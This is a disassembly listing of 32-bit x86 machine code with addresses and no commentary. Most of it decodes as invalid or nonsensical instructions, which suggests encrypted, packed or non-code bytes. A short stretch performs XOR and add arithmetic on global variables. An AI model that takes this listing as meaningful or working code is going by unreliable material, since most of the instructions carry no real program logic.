  41164f:	xchg   edi,eax
  411650:	test   eax,0xf45c6e54
  411655:	mov    ecx,0x8f84de95
  41165a:	xor    BYTE PTR [edi],0x72
  41165d:	jae    0x41161b
  41165f:	dec    esp
  411660:	jno    0x411692
  411662:	stos   DWORD PTR es:[edi],eax
  411663:	push   eax
  411664:	popf   
  411665:	mov    esp,0x22a8a269
  41166a:	retf   0xe2a0
  41166d:	or     DWORD PTR ss:[eax],esp
  411670:	push   0xc7799c12
  411675:	sub    al,0xfb
  411677:	jg     0x411614
  411679:	mov    dh,0xa2
  41167b:	adc    eax,0x5858b764
  411680:	imul   DWORD PTR [ebx+0x53]
  411683:	sbb    BYTE PTR [edx-0x3295ae49],al
  411689:	pop    ds
  41168a:	xchg   esi,eax
  41168b:	lods   eax,DWORD PTR ds:[esi]
  41168c:	test   al,0x75
  41168e:	test   DWORD PTR [edi-0x48],edx
  411691:	shl    BYTE PTR [ecx+0xfc975e9],0x69
  411698:	xchg   DWORD PTR [ebx],esp
  41169a:	pop    esi
  41169b:	inc    esp
  41169c:	jnp    0x411659
  41169e:	push   esp
  41169f:	add    cl,BYTE PTR [edi+0x49]
  4116a2:	test   BYTE PTR gs:[ebx],0xf6
  4116a6:	rol    ebp,cl
  4116a8:	popa   
  4116a9:	popa   
  4116aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ab:	dec    esi
  4116ac:	and    ah,ch
  4116ae:	mov    dh,0x9a
  4116b0:	imul   edi,esi,0xffffff94
  4116b3:	jbe    0x41167a
  4116b5:	hlt    
  4116b6:	inc    edx
  4116b7:	jno    0x41171f
  4116b9:	cmp    ch,dl
  4116bb:	or     eax,0x10c3f190
  4116c0:	jp     0x411669
  4116c2:	xchg   edi,eax
  4116c3:	and    al,0xe2
  4116c5:	mov    dl,0xe4
  4116c7:	or     al,cl
  4116c9:	ins    BYTE PTR es:[edi],dx
  4116ca:	mov    ah,0x7
  4116cc:	pop    ebx
  4116cd:	xchg   esp,eax
  4116ce:	stos   BYTE PTR es:[edi],al
  4116cf:	out    dx,al
  4116d0:	xor    eax,0x705bcac1
  4116d5:	sub    esp,DWORD PTR [eax-0x706e7a80]
  4116db:	pushf  
  4116dc:	dec    ebp
  4116dd:	jecxz  0x411722
  4116df:	call   FWORD PTR [eax+0x49e031c7]
  4116e5:	retf   
  4116e6:	and    edx,eax
  4116e8:	xchg   edi,eax
  4116e9:	aam    0xac
  4116eb:	or     al,0xc8
  4116ed:	mov    dl,0x5e
  4116ef:	test   DWORD PTR [edx+0x408c13c2],0x9b1a8d71
  4116f9:	dec    esp
  4116fa:	les    ebx,FWORD PTR [eax]
  4116fc:	test   eax,edi
  4116fe:	ins    BYTE PTR es:[edi],dx
  4116ff:	cwde   
  411700:	lahf   
  411701:	dec    ecx
  411702:	retf   
  411703:	pushf  
  411704:	add    al,0x47
  411706:	mov    ax,ds:0xeef6699d
  41170c:	fwait
  41170d:	sbb    DWORD PTR [edi],edx
  41170f:	mov    esi,0x930bb7fe
  411714:	mov    esi,0x75897566
  411719:	xor    DWORD PTR ds:0x7c84e42a,esi
  41171f:	loopne 0x411754
  411721:	(bad)  
  411722:	mov    BYTE PTR ds:0x49ca913b,ch
  411728:	mov    ds:0x8c32452b,eax
  41172d:	in     eax,0x51
  41172f:	adc    DWORD PTR [esi-0x77da72b6],0x1f26544d
  411739:	cmp    ch,bl
  41173b:	in     al,dx
  41173c:	nop
  41173d:	pop    ebx
  41173e:	xchg   esi,eax
  41173f:	cld    
  411740:	or     BYTE PTR [ebp-0x3483cb62],cl
  411746:	std    
  411747:	xor    BYTE PTR [ebp+0x9],cl
  41174a:	jbe    0x411729
  41174c:	xor    DWORD PTR [eax-0x6c],edi
  41174f:	sub    DWORD PTR [ecx-0x2d],ebx
  411752:	test   BYTE PTR ss:[esi+0x78718dda],bh
  411759:	cwde   
  41175a:	jb     0x4116fc
  41175c:	xor    esi,ecx
  41175e:	mov    BYTE PTR [esi],bl
  411760:	stos   BYTE PTR es:[edi],al
  411761:	adc    eax,edi
  411763:	dec    edi
  411764:	iret   
  411765:	mov    ebx,0xad16d9e6
  41176a:	xor    eax,0x17516646
  41176f:	cld    
  411770:	leave  
  411771:	xor    edi,DWORD PTR [ebp-0xd]
  411774:	push   0x95aa490d
  411779:	in     eax,0xee
  41177b:	mov    cl,0xe2
  41177d:	stc    
  41177e:	nop
  41177f:	xchg   dl,cl
  411781:	ret    
  411782:	mov    ecx,0x253f8f7d
  411787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411788:	and    BYTE PTR [ebx-0x63],0x76
  41178c:	fwait
  41178d:	push   0x6d4a74c3
  411792:	xor    eax,DWORD PTR [ebp+0x4f1aad59]
  411798:	test   BYTE PTR [ecx-0x2d2c312a],ch
  41179e:	(bad)  
  41179f:	scas   al,BYTE PTR es:[edi]
  4117a0:	repz imul edi,DWORD PTR [edx+ebp*4-0x21e7c79c],0x43afd35
  4117ac:	ss pop edi
  4117ae:	gs push edi
  4117b0:	mov    eax,0xbb75dd16
  4117b5:	jmp    0x411798
  4117b7:	inc    edx
  4117b8:	daa    
  4117b9:	lock sub DWORD PTR [ecx+0x1432ff91],ecx
  4117c0:	into   
  4117c1:	sub    al,0xb3
  4117c3:	xor    esp,DWORD PTR [eax-0x33]
  4117c6:	adc    eax,0xe9070609
  4117cb:	push   edx
  4117cc:	mov    WORD PTR [edi],?
  4117ce:	adc    BYTE PTR [ecx-0x34],cl
  4117d1:	sahf   
  4117d2:	pushf  
  4117d3:	popf   
  4117d4:	adc    eax,0x5471a849
  4117d9:	sbb    al,0x7a
  4117db:	mov    eax,0xb41d3904
  4117e0:	jmp    0x411804
  4117e2:	rol    DWORD PTR [eax],cl
  4117e4:	adc    ebx,ebx
  4117e6:	pop    ebp
  4117e7:	cmp    bl,BYTE PTR [eax]
  4117e9:	cmp    BYTE PTR [edi],0x51
  4117ec:	das    
  4117ed:	xor    ch,bl
  4117ef:	inc    edx
  4117f0:	mov    dl,bl
  4117f2:	xchg   edi,eax
  4117f3:	and    eax,0xc196fd0b
  4117f8:	add    bl,BYTE PTR [eax-0x10]
  4117fb:	loope  0x411846
  4117fd:	jae    0x41183a
  4117ff:	int3   
  411800:	mov    ch,BYTE PTR ds:0x871f7e9a
  411806:	cmp    DWORD PTR [edx],edi
  411808:	addr16 ja 0x41179d
  41180b:	pop    ds
  41180c:	xor    eax,0x6772a026
  411811:	pop    edi
  411812:	lahf   
  411813:	mov    edi,0x1cb5a971
  411818:	fisub  WORD PTR [ebp+0x11]
  41181b:	fidivr WORD PTR [edx-0x42fe349b]
  411821:	fld    TBYTE PTR [edx]
  411823:	jge    0x411853
  411825:	pop    edx
  411826:	(bad)  
  411827:	jno    0x41189f
  411829:	jns    0x41181c
  41182b:	cdq    
  41182c:	(bad)  
  41182d:	call   0x1668:0x98f71a0
  411834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411835:	pop    edi
  411836:	inc    edx
  411837:	stos   BYTE PTR es:[edi],al
  411838:	adc    esi,DWORD PTR [edx-0x3a]
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fd75,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fdfa,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fdf6,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x524f2be9],dl
  41187c:	cmp    al,0x76
  41187e:	push   edi
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118bb
  411886:	out    dx,eax
  411887:	mov    cl,0xcb
  411889:	or     eax,0xed0c448e
  41188e:	xchg   edi,eax
  41188f:	in     al,0xc9
  411891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411892:	cmp    eax,0xf65350ec
  411897:	shr    BYTE PTR [ebx+0x59c4209],1
  41189d:	push   0x56bd378e
  4118a2:	es jmp 0xbd99:0xbff8aeab
  4118aa:	mov    eax,DWORD PTR [edi-0x1bfeed8a]
  4118b0:	call   0x8039:0x561e933b
  4118b7:	(bad)  
  4118b9:	clc    
  4118ba:	push   ebx
  4118bb:	in     al,0xb8
  4118bd:	cs jge 0x41193f
  4118c0:	call   0x632551dd
  4118c5:	mov    ah,0x97
  4118c7:	cmp    al,0x6e
  4118c9:	xor    al,0x19
  4118cb:	dec    esp
  4118cc:	or     esp,esp
  4118ce:	and    ebx,edx
  4118d0:	sub    ebp,DWORD PTR [ecx+ebx*2]
  4118d3:	bound  edx,QWORD PTR [ebx-0x167d17ee]
  4118d9:	or     dl,BYTE PTR [edx]
  4118db:	and    al,0x62
  4118dd:	mov    ecx,0x395c6cf6
  4118e2:	bound  esp,QWORD PTR [eax-0x74fe49cd]
  4118e8:	pop    es
  4118e9:	sub    bl,BYTE PTR [esi]
  4118eb:	jo     0x411874
  4118ed:	inc    esp
  4118ee:	cs jmp 0x5cab:0xd332f89d
  4118f6:	daa    
  4118f7:	pusha  
  4118f8:	fcom   DWORD PTR ss:[edx-0x580c887e]
  4118ff:	rcr    ebx,1
  411901:	sub    BYTE PTR [ebp+0x6e],ah
  411904:	(bad)  
  411905:	pop    edi
  411906:	sbb    DWORD PTR [edx+eiz*1],edi
  411909:	iret   
  41190a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41190b:	(bad)  
  41190c:	int    0x17
  41190e:	adc    edx,ebp
  411910:	ins    BYTE PTR es:[edi],dx
  411911:	test   al,0xe9
  411913:	jnp    0x41194f
  411915:	inc    edi
  411916:	and    eax,ebp
  411918:	xor    eax,0xca24d185
  41191d:	xor    DWORD PTR [ebx-0x49578578],esp
  411923:	push   0xfffffff5
  411925:	cmc    
  411926:	and    al,0x53
  411928:	fst    DWORD PTR [bx+0x36]
  41192c:	pop    esp
  41192d:	mov    dl,0x0
  41192f:	cmp    eax,0x5a49dea5
  411934:	rcr    BYTE PTR [bx+si-0x47],1
  411938:	mov    bh,0x1a
  41193a:	sbb    bl,cl
  41193c:	(bad)
  411940:	add    ch,ch
  411942:	and    eax,esp
  411944:	daa    
  411945:	fldcw  WORD PTR [esi]
  411947:	nop
  411948:	lahf   
  411949:	push   esp
  41194a:	push   edx
  41194b:	jbe    0x411935
  41194d:	jo     0x41196c
  41194f:	imul   eax,DWORD PTR [edi+0x269ca49],0xd693ccf0
  411959:	jmp    0x196b:0xfbc002ec
  411960:	fisttp QWORD PTR [ebp+eax*2-0x51]
  411964:	jns    0x41190d
  411966:	icebp  
  411967:	adc    dl,al
  411969:	cdq    
  41196a:	pop    esi
  41196b:	xlat   BYTE PTR ds:[ebx]
  41196c:	in     eax,0xe2
  41196e:	inc    esp
  41196f:	lods   al,BYTE PTR ds:[esi]
  411970:	lea    ebx,[ebp+0x33740bd3]
  411976:	mov    eax,ds:0x20618fa1
  41197b:	jg     0x411957
  41197d:	ret    0xc4af
  411980:	jne    0x411976
  411982:	and    al,0xa7
  411984:	xchg   ebp,eax
  411985:	add    BYTE PTR [ebx+0x36275c69],bh
  41198b:	push   ds
  41198c:	add    edi,DWORD PTR [ebp+0x2fba63a9]
  411992:	cmp    BYTE PTR [eax-0x65],dh
  411995:	pop    esp
  411996:	mov    ah,0x42
  411998:	ins    BYTE PTR es:[edi],dx
  411999:	rcl    DWORD PTR [esi+0x33],0x82
  41199d:	add    al,0xd6
  41199f:	sbb    bl,bl
  4119a1:	pop    edx
  4119a2:	cmp    DWORD PTR [ebx],ebp
  4119a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a5:	cs out dx,eax
  4119a7:	push   ebp
  4119a8:	jae    0x4119b1
  4119aa:	mov    ebx,DWORD PTR [ecx-0x29]
  4119ad:	sbb    esp,DWORD PTR [edx+0xf]
  4119b0:	hlt    
  4119b1:	scas   al,BYTE PTR es:[edi]
  4119b2:	hlt    
  4119b3:	icebp  
  4119b4:	push   ebx
  4119b5:	popa   
  4119b6:	rol    esi,cl
  4119b8:	pop    edx
  4119b9:	push   ebx
  4119ba:	xchg   esi,eax
  4119bb:	mov    ch,0xd5
  4119bd:	test   eax,0x143db7b9
  4119c2:	ins    DWORD PTR es:[edi],dx
  4119c3:	lods   eax,DWORD PTR ds:[esi]
  4119c4:	adc    al,0xd3
  4119c6:	int    0x49
  4119c8:	adc    DWORD PTR [ecx],esp
  4119ca:	pusha  
  4119cb:	pushf  
  4119cc:	dec    edi
  4119cd:	aaa    
  4119ce:	and    DWORD PTR [ecx-0x5991a256],edi
  4119d4:	out    0x25,al
  4119d6:	sbb    al,0xfa
  4119d8:	dec    DWORD PTR [esi+0x576ce488]
  4119de:	add    edx,esi
  4119e0:	add    edi,0x13180246
  4119e6:	dec    ebx
  4119e7:	test   eax,0xad1e64ec
  4119ec:	sub    al,0x54
  4119ee:	jle    0x4119b8
  4119f0:	std    
  4119f1:	shl    BYTE PTR [edx+0x5b12a4c],1
  4119f7:	push   ecx
  4119f8:	imul   edi,DWORD PTR [eax],0x3125fdc4
  4119fe:	sub    BYTE PTR [eax+0x6023bc3f],dh
  411a04:	push   ebp
  411a05:	ret    0xb84
  411a08:	loope  0x411a5b
  411a0a:	fcmovb st,st(5)
  411a0c:	cmp    BYTE PTR [edi-0xf],al
  411a0f:	pop    eax
  411a10:	idiv   edi
  411a12:	inc    esi
  411a14:	xchg   edx,eax
  411a15:	cs je  0x411a4a
  411a18:	add    BYTE PTR [esi+0x35],bh
  411a1b:	loope  0x4119b7
  411a1d:	jne    0x4119aa
  411a1f:	jmp    0xe61b8320
  411a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a25:	jbe    0x411a04
  411a27:	ss and eax,0xd3b3c2f8
  411a2d:	(bad)  
  411a2e:	and    al,0x57
  411a30:	cmp    ch,BYTE PTR [esi+0x10339adb]
  411a36:	pusha  
  411a37:	pop    eax
  411a38:	pop    esi
  411a39:	(bad)  
  411a3a:	ret    
  411a3b:	dec    edx
  411a3c:	jnp    0x411a6f
  411a3e:	movntq (bad),mm2
  411a3f:	out    0xd1,eax
  411a41:	push   0xffffffb6
  411a43:	retf   0x5f05
  411a46:	mov    bl,0x43
  411a48:	std    
  411a49:	push   edx
  411a4a:	pop    es
  411a4b:	ficomp DWORD PTR [edi+0x19]
  411a4e:	jecxz  0x4119f3
  411a50:	test   ebx,edx
  411a52:	imul   ebp,DWORD PTR [eax+ebx*8-0x43d839d1],0x3a286d11
  411a5d:	jmp    0x15b1d6fe
  411a62:	out    0x36,al
  411a64:	(bad)  
  411a65:	hlt    
  411a66:	inc    ecx
  411a67:	(bad)  [ecx-0x10]
  411a6a:	sbb    edi,0x64ae0617
  411a70:	mov    cl,0xb0
  411a72:	inc    esp
  411a73:	shl    BYTE PTR ds:0xd25545a7,1
  411a79:	dec    esp
  411a7a:	dec    esi
  411a7b:	outs   dx,DWORD PTR ds:[esi]
  411a7c:	mov    WORD PTR [eax],fs
  411a7e:	xor    ch,BYTE PTR [esi-0x43]
  411a81:	gs lahf 
  411a83:	mov    eax,ds:0xdf7bcd74
  411a88:	pop    es
  411a89:	adc    BYTE PTR [esi],0x56
  411a8c:	in     al,dx
  411a8d:	lea    ebp,[eax-0x9c51958]
  411a93:	jmp    0x6b60:0x741e528b
  411a9a:	and    ah,0xe6
  411a9d:	push   esp
  411a9e:	lods   eax,DWORD PTR ds:[esi]
  411a9f:	jmp    0xa846e92f
  411aa4:	mov    eax,ds:0x70cbd3d6
  411aa9:	(bad)  
  411aab:	retf   
  411aac:	or     BYTE PTR [ebp+0x65],0x22
  411ab0:	call   0xb7d:0x90e01c56
  411ab7:	retf   0xca41
  411aba:	push   ebx
  411abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411abc:	sbb    ebp,DWORD PTR [ebx]
  411abe:	sub    eax,0x584158a8
  411ac3:	(bad)  
  411ac4:	scas   eax,DWORD PTR es:[edi]
  411ac5:	pop    es
  411ac6:	jmp    0x6c37e443
  411acb:	jnp    0x411b01
  411acd:	cld    
  411ace:	mov    bh,0xfd
  411ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad1:	lea    edx,ds:0xff88b896
  411ad7:	add    dl,ch
  411ad9:	js     0x411abf
  411adb:	rol    DWORD PTR [esi],1
  411add:	fbstp  TBYTE PTR [edi]
  411adf:	pop    es
  411ae0:	dec    esp
  411ae1:	repnz sbb al,BYTE PTR [eax+0x23b7dc0b]
  411ae8:	pop    eax
  411ae9:	xchg   esp,eax
  411aea:	or     eax,0x7947c4e8
  411aef:	fimul  DWORD PTR [edi]
  411af1:	call   0x5508:0x26c391f9
  411af8:	or     DWORD PTR [ebx-0x2ec0f548],esp
  411afe:	jb     0x411a8f
  411b00:	add    edx,DWORD PTR [edx-0x24]
  411b03:	xor    esp,DWORD PTR [eax-0x5958f2bd]
  411b09:	and    ebx,DWORD PTR [ebx+0x46]
  411b0c:	mov    edx,0x9bf70a04
  411b11:	xor    BYTE PTR [edx-0x35],dl
  411b14:	mov    BYTE PTR [eax+0x7],ah
  411b17:	mov    esi,0x7b7523c6
  411b1c:	ret    
  411b1d:	fld    QWORD PTR [eax+0x80cd0cd]
  411b23:	cld    
  411b24:	dec    eax
  411b25:	jmp    0x411b01
  411b27:	lods   al,BYTE PTR ds:[esi]
  411b28:	(bad)  
  411b29:	scas   eax,DWORD PTR es:[edi]
  411b2a:	bnd jne 0x411b54
  411b2d:	cmp    ecx,ecx
  411b2f:	sbb    al,BYTE PTR [edi]
  411b31:	sbb    cl,ah
  411b33:	xchg   BYTE PTR [ebx],ch
  411b35:	mov    edx,0xce00d0e2
  411b3a:	adc    DWORD PTR [ebp+0x5e5a6271],eax
  411b40:	test   BYTE PTR [edi+0xe44ce96],cl
  411b46:	mov    DWORD PTR [edx],esi
  411b48:	pop    es
  411b49:	loopne 0x411b74
  411b4b:	(bad)  
  411b4c:	dec    edx
  411b4d:	int3   
  411b4e:	(bad)  
  411b4f:	pop    edx
  411b50:	(bad)  
  411b51:	mov    ah,0xa2
  411b53:	dec    esp
  411b54:	add    DWORD PTR ds:0x9acab70e,ebx
  411b5a:	sbb    DWORD PTR [esi+0xc],ebp
  411b5d:	pop    ds
  411b5e:	pop    ebp
  411b5f:	icebp  
  411b60:	mov    al,ds:0x3fff3ed6
  411b65:	lods   eax,DWORD PTR ds:[esi]
  411b66:	xchg   edx,eax
  411b67:	rol    BYTE PTR [ebx],cl
  411b69:	test   BYTE PTR [ecx],cl
  411b6b:	ds (bad) 
  411b6d:	scas   al,BYTE PTR es:[edi]
  411b6e:	aam    0x22
  411b70:	stos   DWORD PTR es:[edi],eax
  411b71:	dec    edx
  411b72:	jae    0x411bc2
  411b74:	jno    0x411b28
  411b76:	push   ebp
  411b77:	cmp    eax,0x9e35f90e
  411b7c:	mov    dl,0x69
  411b7e:	pop    ds
  411b7f:	push   ds
  411b80:	loopne 0x411bd9
  411b82:	dec    eax
  411b83:	mov    ah,0xc2
  411b85:	ret    0xe7ac
  411b88:	mov    al,0xae
  411b8a:	pop    edi
  411b8b:	test   BYTE PTR [eax-0x1a6c4456],dl
  411b91:	push   cs
  411b92:	mov    esp,DWORD PTR [eax+0x7f]
  411b95:	leave  
  411b96:	mov    ds:0x9d51f447,al
  411b9b:	dec    eax
  411b9c:	sbb    ecx,DWORD PTR [edx+eiz*2]
  411b9f:	mov    eax,0x267ff955
  411ba4:	imul   ebx,DWORD PTR [edi-0x5a],0x113bf0c5
  411bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bac:	mov    esi,0xab8d8a27
  411bb1:	mov    eax,0x686371aa
  411bb6:	sub    edi,DWORD PTR [edx]
  411bb8:	add    esi,DWORD PTR [ecx-0x2f]
  411bbb:	std    
  411bbc:	jecxz  0x411c2b
  411bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bbf:	cmp    BYTE PTR [ebp-0x52],al
  411bc2:	les    ebx,FWORD PTR [ebp-0x2c]
  411bc5:	push   edi
  411bc6:	loopne 0x411b5f
  411bc8:	or     al,0x12
  411bca:	stos   BYTE PTR es:[edi],al
  411bcb:	xchg   esp,eax
  411bcc:	mov    ch,0xa8
  411bce:	pop    ss
  411bcf:	loope  0x411bcb
  411bd1:	fdiv   st,st(7)
  411bd3:	lds    esi,FWORD PTR [ebx-0x20]
  411bd6:	stos   DWORD PTR es:[edi],eax
  411bd7:	pop    esi
  411bd8:	in     eax,0x44
  411bda:	mov    al,0xdf
  411bdc:	fisttp DWORD PTR [edi]
  411bde:	push   esi
  411bdf:	call   0xb8f5:0x7fe3f9b6
  411be6:	adc    al,0xd
  411be8:	dec    ebx
  411be9:	inc    esi
  411bea:	mov    al,ss:0xcacd4830
  411bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf1:	sar    BYTE PTR [ecx+0xc],1
  411bf4:	ja     0x411bdd
  411bf6:	aaa    
  411bf7:	mov    cl,bh
  411bf9:	lea    edi,ds:0xba606b8c
  411bff:	dec    ebx
  411c00:	mov    WORD PTR [esi],gs
  411c02:	nop
  411c03:	push   0x7d2b6df5
  411c08:	mov    bl,BYTE PTR [eax+edx*8+0x54c665c7]
  411c0f:	popa   
  411c10:	(bad)  
  411c11:	xchg   esi,eax
  411c12:	pushf  
  411c13:	imul   ecx,DWORD PTR [ebx-0xbf2706a],0xe368fd7b
  411c1d:	push   edi
  411c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c1f:	push   ebx
  411c20:	add    ah,ch
  411c22:	inc    ebp
  411c23:	mov    ?,WORD PTR [ecx-0x1a9becf2]
  411c29:	pop    edi
  411c2b:	lahf   
  411c2c:	add    al,0x1a
  411c2e:	push   0x6d
  411c30:	enter  0xfff7,0x46
  411c34:	es jb  0x411c0d
  411c37:	stos   DWORD PTR es:[edi],eax
  411c38:	xchg   ah,dh
  411c3a:	lahf   
  411c3b:	push   esp
  411c3c:	sub    DWORD PTR [eax+0x7ea120e7],edi
  411c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c43:	push   ebx
  411c44:	mov    al,ds:0x45ad9706
  411c49:	pop    ebp
  411c4a:	mov    ch,0xad
  411c4c:	pop    esp
  411c4d:	mov    ch,0x95
  411c4f:	cmp    bh,BYTE PTR [ebp+ebx*1+0x46975d76]
  411c56:	jecxz  0x411c77
  411c58:	add    ebp,DWORD PTR [edi+0x601caab7]
  411c5e:	ficom  WORD PTR [ebx]
  411c60:	pop    eax
  411c61:	imul   esi,esi,0xffffffa8
  411c64:	cli    
  411c65:	xor    bl,dh
  411c67:	push   ds
  411c68:	fwait
  411c69:	mov    dl,0x28
  411c6b:	mov    bh,0x31
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x1e340a5e
  411cb8:	jle    0x411d18
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c42
  411cc2:	mov    DWORD PTR [edi],edi
  411cc4:	adc    al,bl
  411cc6:	retf   
  411cc7:	repz add BYTE PTR gs:[edi],cl
  411ccb:	jmp    0x411c5a
  411ccd:	popa   
  411cce:	outs   dx,DWORD PTR ds:[esi]
  411ccf:	jmp    0xb2e5:0xef145f70
  411cd6:	arpl   WORD PTR [ebx+0x348cdd23],cx
  411cdc:	xchg   DWORD PTR [ecx-0x10],esi
  411cdf:	xchg   ecx,eax
  411ce0:	mov    ebp,0x916efb1
  411ce5:	(bad)  
  411ce6:	icebp  
  411ce7:	dec    eax
  411ce8:	(bad)  
  411ce9:	jecxz  0x411cf3
  411ceb:	sub    eax,0x51db4361
  411cf0:	adc    BYTE PTR [ebp-0x21694fec],al
  411cf6:	lods   al,BYTE PTR ds:[esi]
  411cf7:	add    al,bh
  411cf9:	xor    al,0x10
  411cfb:	adc    eax,ecx
  411cfd:	iret   
  411cfe:	pushf  
  411cff:	in     al,dx
  411d00:	shl    BYTE PTR [esi+0x715232bd],0x10
  411d07:	ss adc bh,cl
  411d0a:	(bad)  
  411d0b:	jg     0x411d49
  411d0d:	hlt    
  411d0e:	repz es daa 
  411d11:	push   ebp
  411d12:	add    BYTE PTR ds:0x5a6b862f,dl
  411d18:	xchg   ecx,eax
  411d19:	push   eax
  411d1a:	pop    es
  411d1b:	aad    0xf5
  411d1d:	or     eax,0x5de18716
  411d22:	mov    eax,DWORD PTR [esi+edx*4]
  411d25:	retf   0x3b7a
  411d28:	retf   
  411d29:	(bad)  
  411d2a:	sbb    DWORD PTR ds:0xa6f4371d,eax
  411d30:	in     eax,0xf7
  411d32:	and    bl,BYTE PTR [ebp+0x7199c5ec]
  411d38:	jmp    0x912:0x8746d2bb
  411d3f:	jl     0x411d8d
  411d41:	rcl    bl,1
  411d43:	mov    cl,0x3e
  411d45:	or     dh,BYTE PTR [esi+ebp*1+0x66]
  411d49:	ret    
  411d4a:	xchg   DWORD PTR [esp+ebx*8+0x38037948],edi
  411d51:	jg     0x411d85
  411d53:	add    al,BYTE PTR [ebx]
  411d55:	mov    BYTE PTR [edi],bl
  411d57:	ds cdq 
  411d59:	addr16 or al,0x6b
  411d5c:	aam    0x71
  411d5e:	sbb    esp,eax
  411d60:	add    dh,0x58
  411d63:	aad    0x84
  411d65:	les    eax,FWORD PTR [ebx+ebp*1-0xa]
  411d69:	fld    QWORD PTR [ebp-0x59]
  411d6c:	pop    ecx
  411d6d:	shl    BYTE PTR [ebx],1
  411d6f:	cmp    BYTE PTR [esi+0x3f],dh
  411d72:	sub    dh,BYTE PTR [ebp-0x6d2d5a76]
  411d78:	std    
  411d79:	mov    ebp,0x1ca5a6e7
  411d7e:	dec    esi
  411d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d80:	icebp  
  411d81:	test   al,0x7d
  411d83:	sbb    al,0x68
  411d85:	sub    al,0x9a
  411d87:	imul   edx,DWORD PTR [ecx+0xe6ea1b3],0x4b
  411d8e:	inc    ebp
  411d8f:	leave  
  411d90:	es cli 
  411d92:	jp     0x411d8f
  411d94:	call   0xf057:0xf6019b78
  411d9b:	mov    eax,ds:0x12a12d69
  411da0:	es push eax
  411da2:	and    edx,ebp
  411da4:	sbb    eax,DWORD PTR [eax]
  411da6:	xor    dh,bh
  411da8:	aaa    
  411da9:	xchg   DWORD PTR [ebp+edi*2-0x5d824c89],esp
  411db0:	dec    esi
  411db1:	and    BYTE PTR [eax],ah
  411db3:	jne    0x411d3b
  411db5:	in     al,0x4c
  411db7:	jmp    0x411d9f
  411db9:	and    DWORD PTR [eax+0xb28c428],edx
  411dbf:	imul   DWORD PTR cs:[esi-0x5da642ad]
  411dc6:	mov    edi,0xdc426a5d
  411dcb:	or     ebx,ebx
  411dcd:	add    eax,DWORD PTR [ecx]
  411dcf:	fmul   QWORD PTR [eax-0xa5c6f6e]
  411dd5:	or     BYTE PTR [edx],bl
  411dd7:	xor    dl,BYTE PTR [ebp+eax*2-0x69]
  411ddb:	je     0x411e30
  411ddd:	cmp    al,0xe1
  411ddf:	mov    cl,0x1d
  411de1:	xchg   ebx,eax
  411de2:	loopne 0x411e2e
  411de4:	mov    al,0x59
  411de6:	pop    ebx
  411de7:	sub    al,0x75
  411de9:	xchg   BYTE PTR [eax+eax*2],dl
  411dec:	pop    ecx
  411ded:	mov    ds:0x95d8bcb2,al
  411df2:	inc    esp
  411df3:	jae    0x411e39
  411df5:	lds    ebp,FWORD PTR [eax+ecx*2]
  411df8:	mov    WORD PTR [esi],cs
  411dfa:	pop    edi
  411dfb:	sub    al,0xc8
  411dfd:	stos   BYTE PTR es:[edi],al
  411dfe:	jno    0x411e58
  411e00:	std    
  411e01:	daa    
  411e02:	mov    bl,0xa7
  411e04:	sahf   
  411e05:	adc    al,0xb1
  411e07:	pop    ss
  411e08:	mov    al,0xd9
  411e0a:	into   
  411e0b:	cmp    al,BYTE PTR [eax]
  411e0d:	ret    0x5ce5
  411e10:	or     ebx,0x3e9ddb2b
  411e16:	jmp    0x87cc:0x4dbaba0f
  411e1d:	sti    
  411e1e:	pop    es
  411e1f:	popf   
  411e20:	std    
  411e21:	gs xchg ebx,eax
  411e23:	jle    0x411dbb
  411e25:	dec    ebx
  411e26:	mov    dl,0xf1
  411e28:	mov    edi,0x8ebc8c9c
  411e2d:	es pop ebp
  411e2f:	ins    DWORD PTR es:[edi],dx
  411e30:	outs   dx,DWORD PTR ds:[esi]
  411e31:	inc    esi
  411e32:	mov    ebp,0xb8d0e0dc
  411e37:	cmp    BYTE PTR [eax-0x56d2084b],dl
  411e3d:	in     eax,dx
  411e3e:	hlt    
  411e3f:	enter  0x4914,0x58
